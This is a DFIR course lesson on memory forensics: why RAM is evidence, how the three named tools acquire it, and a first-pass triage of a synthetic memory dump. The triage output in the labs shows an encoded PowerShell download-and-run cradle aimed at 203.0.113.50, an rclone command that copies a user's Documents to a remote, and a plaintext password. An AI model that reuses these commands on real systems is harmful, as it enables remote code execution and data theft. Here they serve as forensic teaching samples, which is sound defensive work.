# Day 23: Memory Forensics Fundamentals & Windows RAM Acquisition

> **Phase 3: Memory Forensics** · **Level:** 🟡→🔴 Intermediate to Advanced · **Time:** ~4 hours (reading + labs) · **Posted:** 2026-10-20
>
> **Tools today:** 🛠️ WinPmem · 🛠️ Magnet RAM Capture · 🛠️ Belkasoft Live RAM Capturer

---

## 🎯 Learning objectives

By the end of today you will be able to:

1. Explain **why RAM is evidence** — what lives only in memory, and why it sits at the top of the order of volatility.
2. Distinguish **physical** from **virtual** memory, and say why a raw dump needs a framework and symbols to become a process list (the bridge to Day 24).
3. Describe the **acquisition problem**: smear, the observer effect, kernel- vs user-mode readers, hardware methods, and anti-acquisition tricks.
4. Acquire Windows RAM with **WinPmem**, **Magnet RAM Capture** and **Belkasoft Live RAM Capturer**, and record the metadata that makes a capture defensible.
5. Do a **first-pass triage** of a raw dump on any OS — integrity, ASCII *and* UTF-16 strings, indicators, entropy — before you ever load a profile.

---

## Part 1: The lesson

For twenty-two days you have worked **disk**: the file system, the registry, logs, browsers, timelines, persistence. All of it survives a reboot. But the most valuable state of a compromised machine often never touches the disk at all, and vanishes the moment the power drops. Today begins **Phase 3: memory forensics** — and it begins, correctly, with *capturing* RAM, because an analysis is only ever as good as the acquisition under it.

### 1.1 Why RAM is evidence

Random-access memory holds the machine **as it is right now**, including things that are nowhere on disk:

- **Running processes and their arguments** — including ones whose executable was deleted, or that only ever lived in memory (fileless malware).
- **Injected and unpacked code** — a packed loader decrypts its payload *into RAM*; the clear version exists only there.
- **Decrypted data and keys** — BitLocker/LUKS volume keys, TLS session keys, password-manager contents, the plaintext of an open encrypted document.
- **Network state** — open sockets, recent connections, the remote IPs an implant is talking to.
- **Credentials in the clear** — cached logons, tokens, and (historically) plaintext passwords in `lsass`.
- **Volatile user traces** — clipboard, typed commands, console buffers, unsaved work.

The classic guidance (RFC 3227, *Order of Volatility*) ranks evidence by how fast it decays: CPU registers and caches, then **RAM**, then network/kernel state, then disk, then backups. You collect most-volatile first. In practice that means: if the machine is **on** and you are authorised, **capture memory before you image the disk and before you pull the plug** — a shutdown throws the whole of RAM away.

### 1.2 Physical versus virtual memory

The tools today produce a **physical memory image**: a flat, byte-for-byte copy of what the RAM chips hold, from physical address 0 upward, in 4 KiB **pages**. That is *not* how a process sees memory. Each process runs in its own **virtual** address space; the CPU's **page tables** map its virtual pages to physical ones (and some virtual pages are paged out to disk, in `pagefile.sys` — Day 27). So in a raw dump:

- a single process's memory is **scattered** across physical pages in no obvious order, interleaved with every other process and the kernel;
- to turn those bytes back into "process `rclone.exe`, PID 4820, these DLLs, these sockets" you need a tool that **walks the kernel's structures** (the `_EPROCESS` list, the page tables) using **symbols** for the exact OS build. That is what Volatility and MemProcFS do — **tomorrow**.

Today's triage deliberately stops short of that: everything in Part 3 treats the dump as **flat bytes**, because integrity, strings and indicator sweeps are the first things you do on *any* capture, and they need no profile.

### 1.3 The acquisition problem

Imaging a powered-off disk is repeatable: the bytes don't move, and two images hash the same. Memory is the opposite, and three facts follow:

- **It is a smear, not a snapshot.** Acquisition takes seconds to minutes, during which the OS keeps running and changing RAM. The image is internally *inconsistent* — a page read at the end may not agree with one read at the start. This is normal; it is why structure-aware tools tolerate some inconsistency, and why you never expect two captures of a live host to match.
- **The observer effect.** Your acquisition tool is itself a process using RAM, loading a driver, allocating buffers — it unavoidably alters the thing it measures. You minimise the footprint (a tiny, statically-linked imager) but you cannot eliminate it. Record that you ran it.
- **How the read is done matters.** Software imagers load a **kernel-mode driver** to read physical memory (user mode cannot). Different methods exist — mapping physical memory via `MmMapIoSpace`, remapping page-table entries, or the legacy `\\.\PhysicalMemory` device — and a rootkit or a hung device-memory range can defeat one but not another, which is why WinPmem ships several. When software can't be trusted (kernel rootkit) there are **hardware** routes: DMA over Thunderbolt/PCILeech, or a cold-boot attack on the chips themselves. Anti-forensics cuts the other way: **anti-dumping** malware and some DRM hide or crash on read, and reading certain device-mapped ranges can hang the box — good imagers map around them.

### 1.4 Formats, metadata, and custody

Most Windows imagers write a **raw** image (sometimes called "padded" — physical gaps filled with zeroes), because raw is the universal input every analysis framework accepts. Others offer containers — **AFF4** (WinPmem's older imager), **EWF/E01**, or Linux's **LiME** format — that fold metadata and compression in. Whatever the container, record, at capture time:

- the **date/time (UTC)** and the operator and authority;
- the **tool and exact version**, and the method/driver used;
- the **amount of RAM** and the resulting image size;
- the **hash** of the finished image (so later copies can be proven identical).

That last point is the one thing about memory that *is* repeatable: once written to a file, a dump is **static evidence** — copy it, and the copy hashes the same. Today's case is a slice of the RAM captured from **WS-ALICE** during live response, before the disk was imaged (Days 9–22). You will verify it, triage it, and leave the structure-aware analysis for Day 24.

---

## Part 2: Tools

All three acquire memory from a **live, running Windows host** and must run **as Administrator** (loading a driver needs it). None of them can run against a Linux analysis box or a dead disk, so they are **not run** in Part 3; their steps are here for when you have a live host in front of you. Flags for WinPmem were checked against its current source; the two GUI tools are described from their vendor documentation, with `VER` standing in for the version you download.

### 🛠️ Tool 1: WinPmem

| | |
|---|---|
| **What** | The long-standing open-source physical-memory imager for Windows (Apache 2.0), originally from the Rekall project. |
| **Why** | Free, self-contained (driver embedded in the exe), scriptable, raw output, and **several read methods** so one usually works even against a kernel rootkit. |

#### Requirements

- Windows 7–11, x86 or x64; **Administrator**.
- Free disk space on a **separate** volume (ideally external) at least as large as installed RAM.

#### Installation

```powershell
# No installer — download the signed standalone imager from the releases page and run it.
# https://github.com/Velocidex/WinPmem/releases   (e.g. winpmem_mini_x64.exe, version VER)
# The 64-bit exe carries both 32- and 64-bit drivers and loads the right one itself.
# Linux host? Use its sibling, Linpmem: https://github.com/Velocidex/Linpmem
```

#### Configuration

None to install. Choices are made on the command line at run time; by default WinPmem picks a safe read method and **auto-unloads** its driver when the image is done. Always write the image to a volume **other** than the one being acquired.

#### Verify the installation

```powershell
# Run with no arguments to print the usage / short manual (and confirm the driver loads):
.\winpmem_mini_x64.exe
```

#### First use / quick start

```powershell
# Acquire a raw physical image using the default method:
.\winpmem_mini_x64.exe physmem.raw
# Force a specific method (1 = MmMapIoSpace) if the default struggles:
.\winpmem_mini_x64.exe -1 physmem.raw
# Then hash it immediately and record the hash with the capture metadata:
Get-FileHash .\physmem.raw -Algorithm SHA256
```

#### Troubleshooting

| Symptom | Fix |
|---|---|
| "Failed to load driver" / access denied | Run the console **as Administrator**; the driver cannot load otherwise. |
| The default method hangs or errors on a range | Try another method (`-1`, or run with no args to list them); device-mapped ranges can stall one method. |
| Need the image over the network / want hashing inline | WinPmem writes to a device interface, so pipe it through your own imager; or use the Python demo tool in the repo. |
| Image larger than the target volume | Write to a bigger/external disk — a raw image is the size of installed RAM. |

### 🛠️ Tool 2: Magnet RAM Capture

| | |
|---|---|
| **What** | A free, lightweight GUI memory acquirer from Magnet Forensics. |
| **Why** | Tiny footprint (small, self-contained exe) to minimise the observer effect; dead-simple for responders; writes raw for any framework. |

#### Requirements

- Windows (x86/x64); **Administrator**.
- A free registration/download from Magnet Forensics; an output volume ≥ installed RAM.

#### Installation

```text
Download Magnet RAM Capture (version VER) from the vendor and run the executable — there is no
install step. Official page: https://www.magnetforensics.com/resources/magnet-ram-capture/
```

#### Configuration

Launch as Administrator. Set the **output path** to an external/separate drive and choose the **segment/format** option offered (raw, or split segments). Keep everything else default to stay small.

#### Verify the installation

```text
Launch the app as Administrator; it reports detected physical memory size. A capture whose output
size matches installed RAM, with a recorded hash, confirms a good run.
```

#### First use / quick start

```text
1. Run as Administrator.
2. Set "Save RAM capture to..." to a folder on a separate/external volume.
3. Click Start; wait for completion.
4. Hash the output (certutil -hashfile <file> SHA256) and record it with the capture notes.
```

#### Troubleshooting

| Symptom | Fix |
|---|---|
| Not enough space | Point the output at a larger external volume; the file is RAM-sized. |
| Capture fails / partial | Re-run as Administrator; close other heavy tools to reduce contention. |
| Framework won't parse it | Confirm you saved **raw** (not a proprietary container) for Volatility input. |

### 🛠️ Tool 3: Belkasoft Live RAM Capturer

| | |
|---|---|
| **What** | A free, small GUI memory acquirer from Belkasoft. |
| **Why** | Uses a **kernel-mode driver** designed to bypass common **anti-dumping** protections, so it can capture RAM of processes that resist analysis; ships 32- and 64-bit builds. |

#### Requirements

- Windows (x86/x64); **Administrator**. Run the build (32/64-bit) that **matches the target OS**.
- Output volume ≥ installed RAM.

#### Installation

```text
Download Belkasoft Live RAM Capturer (version VER) and unzip; run RamCapture64.exe (or
RamCapture.exe for 32-bit). No install step. Official page: https://belkasoft.com/ram-capturer
```

#### Configuration

Run the matching-bitness executable as Administrator, and set the **output folder** to a separate/external drive. The kernel-mode driver is loaded for you.

#### Verify the installation

```text
Launch as Administrator; it shows the output-folder selector and the detected memory size. A
completed .mem whose size matches installed RAM confirms the run; hash it afterwards.
```

#### First use / quick start

```text
1. Run RamCapture64.exe as Administrator (RamCapture.exe on a 32-bit target).
2. Choose the output folder (separate/external volume).
3. Click Capture!; it writes a raw .mem image.
4. Hash it (certutil -hashfile <file> SHA256) and record the hash.
```

#### Troubleshooting

| Symptom | Fix |
|---|---|
| Wrong-bitness error / driver won't load | Use the build matching the target (RamCapture64 on 64-bit Windows), as Administrator. |
| Anti-malware blocks the driver | Expected with its kernel driver; acquire from a trusted responder account / document the alert. |
| Output won't load in a framework | It writes raw `.mem`; pass that path straight to Volatility. |

---

## Part 3: Hands-on labs

You can't acquire Windows RAM on a Linux box, and a real capture is gigabytes that change every second — so the labs work on a **small, deterministic raw sample** built by `mk_mem_sample.py`, laid out like physical memory (4 KiB pages, mostly zero) and seeded with the WS-ALICE artifacts. The point is the workflow you run on **any** raw dump the moment it lands, *before* Volatility: verify it, pull strings in both encodings, sweep indicators, and spot encrypted pages. `mem_triage.py` does that sweep; everything here is standard tooling (`sha256sum`, `strings`, `xxd`) plus the two course scripts.

Run on Ubuntu/SIFT (or any Linux/macOS). Nothing needs root or a Windows host.

```bash
sudo apt update && sudo apt install -y git python3 binutils xxd
git -C ~/DFIR pull 2>/dev/null || git clone https://github.com/Mr-Phoenix07/DFIR.git ~/DFIR
mkdir -p ~/cases/LAB-023/{evidence,work,notes} && cd ~/cases/LAB-023
export TZ=UTC
python3 ~/DFIR/scripts/mk_mem_sample.py evidence/ws-alice.mem
```

```
wrote evidence/ws-alice.mem: 16777216 bytes (4096 pages of 4096), 8 artifact pages
sha256: 3421712540af37d5b51ec1648020c9fa46bdb4fc595e571b295e9a0a941d5542
```

### Lab 1: Integrity and chain of custody (10 min)

A memory capture can't be re-acquired identically — but once written, it's a static file you must be able to prove unchanged. Hash it into your notes and show a copy is bit-for-bit identical (fill in `templates/chain-of-custody-form.md` for the real thing):

```bash
(cd evidence && sha256sum ws-alice.mem | tee ../notes/ws-alice.mem.sha256)
(cd evidence && sha256sum -c ../notes/ws-alice.mem.sha256)
cp evidence/ws-alice.mem work/transfer.mem
cmp evidence/ws-alice.mem work/transfer.mem && echo "copy is bit-for-bit identical: a saved dump is static evidence"
```

```
3421712540af37d5b51ec1648020c9fa46bdb4fc595e571b295e9a0a941d5542  ws-alice.mem
ws-alice.mem: OK
copy is bit-for-bit identical: a saved dump is static evidence
```

The recorded SHA-256 is how every later copy is proven to be the same evidence. Contrast that with the capture itself: re-run WinPmem on the live host a minute later and the image would differ in thousands of pages — memory is a moving target, which is exactly why you hash the **acquired file**, not the RAM.

### Lab 2: Strings, in both encodings (15 min)

The fastest first look is `strings` — but Windows keeps most text as **UTF-16LE** (wide chars), which a default ASCII scan skips entirely. Always run both:

```bash
echo "ASCII strings (>=6):    $(strings -n 6 evidence/ws-alice.mem | wc -l)"
echo "UTF-16LE strings (>=6): $(strings -e l -n 6 evidence/ws-alice.mem | wc -l)"
echo '--- the rclone command line: invisible to an ASCII scan, found as wide chars ---'
strings -n 6 evidence/ws-alice.mem | grep -c rclone
strings -e l -t x -n 6 evidence/ws-alice.mem | grep rclone
```

```
ASCII strings (>=6):    14
UTF-16LE strings (>=6): 10
--- the rclone command line: invisible to an ASCII scan, found as wide chars ---
1
  c8000 C:\Users\alice\AppData\Local\Temp\rc\rclone.exe copy C:\Users\alice\Documents remote:drop --config C:\Users\alice\AppData\Local\Temp\rc\rc.conf
```

The ASCII pass finds the console/command-line text; it returns **nothing** for the rclone command line (`grep -c` prints `0`), because that string is stored wide. `strings -e l` (little-endian 16-bit) recovers it, with its byte offset. Miss this and you miss half the evidence in a Windows dump.

### Lab 3: First-pass triage (25 min)

One tool rolls the first questions together — size and hash, both string encodings, the indicators worth grepping immediately, and the high-entropy pages — on any raw image, WinPmem's or a vendor tool's:

```bash
python3 ~/DFIR/scripts/mem_triage.py evidence/ws-alice.mem
```

```
== image ==
file: evidence/ws-alice.mem   size: 16777216 bytes   pages: 4096 x 4096
sha256: 3421712540af37d5b51ec1648020c9fa46bdb4fc595e571b295e9a0a941d5542

== strings ==
ASCII (>=6):    14
UTF-16LE (>=6): 10

== indicators ==
[enc ] 0x00064029  -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1ADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==
             decodes to: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/payload.ps1')
[URL ] 0x0006503c  http://203.0.113.50/payload.ps1
[IPv4] 0x00065043  203.0.113.50
[UNC ] 0x000c9000  \\203.0.113.50\drop
[IPv4] 0x000c9002  203.0.113.50
[cred] 0x0012c00c  Password: Autumn2026!
[cred] 0x0012c029  Password=Autumn2026!
[IPv4] 0x00190007  10.20.30.40
[IPv4] 0x0019001c  203.0.113.50

== high-entropy pages (> 7.5 bits/byte) ==
0x00309000  entropy 7.95
```

Read top to bottom. The strings counts flag that there's wide-char content to chase. The indicator sweep surfaces the whole WS-ALICE story straight from RAM: a `powershell -enc` blob — **decoded in place** to the download cradle that pulls `http://203.0.113.50/payload.ps1` — the C2 IP again in a UNC path and a live connection line, and a **plaintext credential**. The last section flags one page at `0x00309000` with ~7.95 bits/byte of entropy: text and code score far lower, so that page is **encrypted or packed** — a stage-2 payload staged in memory. None of this needed a profile.

### Lab 4: Offsets and the wide-char page (15 min)

Every finding has a byte offset you can seek back to. Pull the wide-char indicators with their offsets, then dump the raw bytes of the C2-share page to see *why* ASCII missed it:

```bash
echo '--- where the wide-char indicators sit (byte offsets) ---'
strings -e l -t x -n 6 evidence/ws-alice.mem | grep -iE 'rclone|drop|PSEXESVC'
echo '--- the C2 share page, raw: UTF-16LE is why ASCII strings missed it ---'
xxd -s 0xc9000 -l 48 evidence/ws-alice.mem
```

```
--- where the wide-char indicators sit (byte offsets) ---
  c8000 C:\Users\alice\AppData\Local\Temp\rc\rclone.exe copy C:\Users\alice\Documents remote:drop --config C:\Users\alice\AppData\Local\Temp\rc\rc.conf
  c9000 \\203.0.113.50\drop
  c9028 PSEXESVC
--- the C2 share page, raw: UTF-16LE is why ASCII strings missed it ---
000c9000: 5c00 5c00 3200 3000 3300 2e00 3000 2e00  \.\.2.0.3...0...
000c9010: 3100 3100 3300 2e00 3500 3000 5c00 6400  1.1.3...5.0.\.d.
000c9020: 7200 6f00 7000 0000 5000 5300 4500 5800  r.o.p...P.S.E.X.
```

The hexdump shows the signature of UTF-16LE: every character is a byte followed by `00` (`\.\.2.0.3...`). That interleaved `00` is what breaks an ASCII scan, and why `strings -e l` — and structure-aware tools tomorrow — are non-negotiable on Windows memory.

### Lab 5: Structure versus noise (10 min)

A raw dump is just pages. Compare a readable page with the entropy-flagged one, byte for byte:

```bash
echo '--- a readable page (0x64000) vs the entropy-flagged page (0x309000) ---'
xxd -s 0x64000 -l 32 evidence/ws-alice.mem
xxd -s 0x309000 -l 32 evidence/ws-alice.mem
```

```
--- a readable page (0x64000) vs the entropy-flagged page (0x309000) ---
00064000: 636d 642e 6578 6520 2f63 2070 6f77 6572  cmd.exe /c power
00064010: 7368 656c 6c2e 6578 6520 2d6e 6f70 202d  shell.exe -nop -
00309000: 7af6 e46b 85d7 83df e625 6e64 5efc 8a0c  z..k.....%nd^...
00309010: fdc7 81ac 6877 ea7f 2aed 9ee7 8b5e c1de  ....hw..*....^..
```

`0x64000` is plain ASCII you can read; `0x309000` is indistinguishable from random — the encrypted payload. Strings and entropy got you this far, but notice what you *cannot* get this way: which process owns that page, what DLLs it loaded, what sockets it holds. For that you need the kernel's structures and the right symbols — **Volatility 3**, tomorrow.

---

## ✅ Knowledge check

1. You arrive at a running, compromised workstation you're authorised to collect. What do you acquire first and why — and what is lost if someone pulls the plug "to be safe"?
2. Name three kinds of evidence that typically exist **only** in RAM.
3. Two captures of the same live host, a minute apart, don't hash the same. Is the tool broken? Explain.
4. Why can't you just read physical memory from a normal user-mode program, and what do all three tools do about it?
5. A raw image is 16 GiB; the box has 16 GiB of RAM. `strings` finds a suspicious IP but you can't tell which process used it. Why not, and what do you need?
6. Your ASCII `strings` run on a Windows dump finds almost nothing interesting, yet the box was clearly busy. What did you forget, and what's the fix?
7. One page scores ~7.95 bits/byte of entropy while its neighbours score ~1–4. What does that suggest, and name one innocent explanation you'd rule out.
8. Belkasoft advertises a kernel-mode driver that bypasses "anti-dumping". What problem is that solving, and what's the trade-off of loading such a driver during an IR?

<details>
<summary><b>Answers</b></summary>

1. **RAM first** (then disk), because it is top of the order of volatility — running processes, injected/fileless code, decrypted data and keys, network state and cleartext credentials live there. Pulling the plug discards **all** of RAM, destroying exactly that evidence; a graceful shutdown is almost as bad. Capture memory while the box is up, then image the disk.
2. Any three: fileless/in-memory-only malware and its arguments; unpacked/decrypted (deobfuscated) code; encryption keys and session keys; open sockets/recent connections; cleartext credentials/tokens; clipboard, typed commands and unsaved documents.
3. **Not broken.** Acquisition is a *smear*, not a snapshot: the OS keeps running and changing pages during the seconds/minutes the copy takes, and the imager itself uses memory (the observer effect). Live RAM is never bit-identical twice — which is why you hash the written image, not the RAM.
4. User mode has no access to physical memory; only the kernel does. All three load a **kernel-mode driver** to read it. (WinPmem embeds and auto-unloads its driver and offers several read methods; Belkasoft's driver is built to get past anti-dumping.)
5. A physical dump interleaves every process's pages with no per-process order; reconstructing "which process, which DLLs, which sockets" means walking the kernel's `_EPROCESS` list and page tables with **symbols for that exact build** — a memory **framework** (Volatility 3 / MemProcFS), not `strings`.
6. You ran an **ASCII-only** scan; Windows stores most strings as **UTF-16LE**. Re-run with `strings -e l` (and have your triage read both encodings) to recover the wide-char text.
7. High entropy ≈ **encrypted or compressed/packed** content — a likely staged payload or key material. Innocent explanations to rule out: a page of already-compressed data (media, a `.zip`/`.gz` buffer), TLS traffic buffers, or random/ASLR fill — confirm by context (what's around it, which process owns it) before calling it malicious.
8. Some malware/DRM actively **resists being dumped** (hides or crashes on read); a kernel-mode reader built to bypass that gets a complete capture anyway. Trade-off: loading a kernel driver **changes the system** (bigger observer-effect footprint) and may trip anti-malware/EDR — so you document the driver, its version, and any alerts as part of the acquisition record.

</details>

---

## 📚 Further reading

- RFC 3227, *Guidelines for Evidence Collection and Archiving* — the order of volatility
- WinPmem (https://github.com/Velocidex/WinPmem) and Linpmem (https://github.com/Velocidex/Linpmem) READMEs
- SANS DFIR, *Memory Forensics* posters and the *Incident Response* cheat sheets
- *The Art of Memory Forensics* (Ligh, Case, Levy, Walters) — chapters 1–4 on acquisition and address spaces
- Volatility Foundation documentation (https://volatilityfoundation.org) — preparing for Day 24
- Microsoft Learn: *Memory Management* / virtual address spaces and page tables

---

## ⏭️ Tomorrow: Day 24

**Memory analysis essentials: processes, DLLs, handles, network.** Tools: **Volatility 3**, **Volatility Workbench**, **MemProcFS**.
Today you captured RAM and skimmed its strings. Tomorrow you give those bytes structure — listing processes, their DLLs and handles, and the network connections — by walking the kernel with the right symbols.

---

<sub>Part of the <a href="../README.md">DFIR Daily</a> series · <a href="../CURRICULUM.md">Full 60-day curriculum</a> · For educational and authorised use only.</sub>
